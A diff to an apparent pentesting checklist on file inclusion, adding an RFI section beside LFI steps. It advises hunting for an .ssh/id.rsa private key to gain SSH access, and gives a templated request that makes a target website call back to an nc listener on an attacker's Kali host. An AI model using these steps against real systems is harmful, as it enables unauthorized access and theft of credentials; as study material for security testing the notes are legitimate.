@@ -6,7 +6,7 @@
 
    b. No then stop
 
-# attempt LFI firstly
+# Attempt LFI 
  
 1. cat a file every user should have access to?
    
@@ -22,5 +22,14 @@
 
    a. Good starting point is look for `.ssh/id.rsa` file in attempt to get ssh access
 
+# Attempt RFI 
+
+1. set up enviroment
+
+   a. Create nc listener on kali
+
+   b. use website to call back to nc listener `<url>/?page=http://<kali ip>:<port>/`
+
+   c. examine nc output
    
 
